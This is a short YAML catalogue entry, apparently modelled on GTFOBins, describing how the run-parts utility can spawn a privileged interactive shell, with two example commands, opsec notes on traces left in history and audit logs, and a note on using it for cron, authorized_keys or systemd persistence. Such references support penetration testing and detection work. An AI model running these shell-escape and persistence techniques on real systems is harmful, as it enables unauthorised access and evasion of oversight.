---
name: run-parts
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: run-parts --new-session --regex '^sh$' /bin --arg='-p'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    cp /bin/sh /path/to/temp-dir/
    run-parts /path/to/temp-dir/ --arg='-p'
references:
- https://gtfobins.github.io/gtfobins/run-parts/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
